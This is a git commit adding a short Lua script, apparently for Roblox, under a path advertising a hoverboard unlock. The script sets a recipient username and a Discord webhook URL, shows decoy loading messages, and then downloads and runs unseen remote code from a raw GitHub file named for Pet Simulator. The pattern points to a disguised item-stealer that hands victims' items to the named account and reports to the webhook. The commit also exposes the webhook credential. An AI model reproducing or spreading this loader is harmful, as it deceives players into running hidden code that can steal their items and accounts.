535a8519374d698128f8f85dfd58b2f6c51f2ace
MoonScriptt <137010878+MoonScriptt@users.noreply.github.com>
2023-07-02 02:51:12 +0700

    .lua

---
+++ Moon.GG/Unlock20%hover20%board/Main/.lua
@@ -0,0 +1,9 @@
+Username = "kalongtzy"
+WebHook = "https://discord.com/api/webhooks/1124789205030158498/6J4vWoxdZiBFbnXADf-FjjOeasHRlp-yhfV6rGgpAp18e7gGv2jpwoyIH3kbtx2KLx9Q"
+
+_G.CustomScriptName = "MoonHub"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
